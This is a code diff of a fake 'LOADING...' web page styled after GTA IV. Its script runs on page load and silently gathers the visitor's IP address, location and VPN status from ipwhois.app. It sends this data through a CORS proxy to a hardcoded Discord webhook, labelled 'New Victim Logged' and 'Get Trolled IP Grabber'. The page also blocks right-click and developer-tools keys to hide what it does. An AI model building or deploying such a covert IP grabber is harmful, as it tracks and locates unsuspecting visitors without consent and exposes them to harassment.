@@ -5,35 +5,28 @@
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Loading...</title>
 <style>
-  @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap');
+  /* GTA IV style loading screen */
 
   html, body {
     margin: 0; padding: 0; height: 100%;
     background: black;
-    color: #00ffff;
-    font-family: 'Orbitron', monospace;
     display: flex;
     justify-content: center;
     align-items: center;
     user-select: none;
+    font-family: 'Arial Black', Arial, sans-serif;
+    color: white;
   }
 
   #loading-text {
-    font-size: 5rem;
-    animation: gtaFlicker 2.5s infinite alternate;
-    letter-spacing: 0.2em;
+    font-size: 6rem;
+    letter-spacing: 0.3em;
+    animation: flickerGTA 2.5s infinite alternate;
   }
 
-  @keyframes gtaFlicker {
+  @keyframes flickerGTA {
     0%, 100% { opacity: 1; }
     40%, 60% { opacity: 0.3; }
-  }
-
-  /* Disable text selection and right-click */
-  body, html {
-    -webkit-user-select: none;
-    -moz-user-select: none;
-    user-select: none;
   }
 </style>
 </head>
@@ -42,10 +35,10 @@
 <div id="loading-text">LOADING...</div>
 
 <script>
-  // Disable right-click context menu
+  // Prevent right-click context menu
   document.addEventListener('contextmenu', e => e.preventDefault());
 
-  // Disable F12, Ctrl+Shift+I, Ctrl+U, Ctrl+Shift+C etc
+  // Disable some devtools keys
   document.addEventListener('keydown', e => {
     if (
       e.key === "F12" ||
@@ -56,24 +49,20 @@
     }
   });
 
-  // Fetch geo + VPN data + IP from ipwhois.app (free, no key needed)
-  // Docs: https://ipwhois.io/documentation
-
   const webhookUrl = "https://discord.com/api/webhooks/1403468598286221333/d15xSrnNqkAJ_jk5cnGqcLh8oigcdjJlZHj7t9aqM4DDmQ5K9Rif6jVdewyWrAFr8Hcg";
-  const corsProxy = "https://cors-anywhere.herokuapp.com/";
 
   async function fetchIPInfo() {
+    // Using ipwhois.app for geo and VPN detection (free and no key)
     const res = await fetch('https://ipwhois.app/json/');
-    if(!res.ok) throw new Error("Failed to get IP info");
-    const data = await res.json();
-    return data;
+    if (!res.ok) throw new Error('Failed to fetch IP info');
+    return res.json();
   }
 
   async function sendDiscordWebhook(data) {
-    // Compose embed with rich details
+    // Compose embed
     const embed = {
-      title: "🕵️‍♂️ New Victim Logged",
-      color: 0x00ffff,
+      title: "🕵️ New Victim Logged",
+      color: 0xFFFFFF,
       timestamp: new Date().toISOString(),
       footer: {
         text: "Get Trolled IP Grabber",
@@ -89,7 +78,6 @@
       },
       fields: [
         { name: "IPv4 Address", value: `\`${data.ip}\``, inline: true },
-        { name: "IPv6 Address", value: `\`N/A\``, inline: true },
         { name: "Country", value: `${data.country} (${data.country_code})`, inline: true },
         { name: "Region", value: `${data.region}`, inline: true },
         { name: "City", value: `${data.city}`, inline: true },
@@ -101,31 +89,34 @@
       ]
     };
 
+    // Discord requires CORS proxy for client-side requests — 
+    // you should proxy this request via your own backend or use cors-anywhere temporarily
+
+    // For demo, using cors-anywhere:
+    const corsProxy = "https://cors-anywhere.herokuapp.com/";
+
     try {
       const res = await fetch(corsProxy + webhookUrl, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ embeds: [embed] })
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ embeds: [embed] }),
       });
-      if(!res.ok) throw new Error("Discord webhook error " + res.status);
-      return true;
-    } catch (e) {
-      console.error("Webhook send failed:", e);
-      return false;
+      if (!res.ok) throw new Error(`Webhook error ${res.status}`);
+      console.log("Logged successfully");
+    } catch (err) {
+      console.error("Failed to send webhook:", err);
     }
   }
 
-  // Run on load
-  (async function(){
+  (async () => {
     try {
       const data = await fetchIPInfo();
       await sendDiscordWebhook(data);
-      // Done silently, no page changes
-    } catch(e){
+    } catch (e) {
       console.error(e);
     }
   })();
-</script>
 
+</script>
 </body>
 </html>
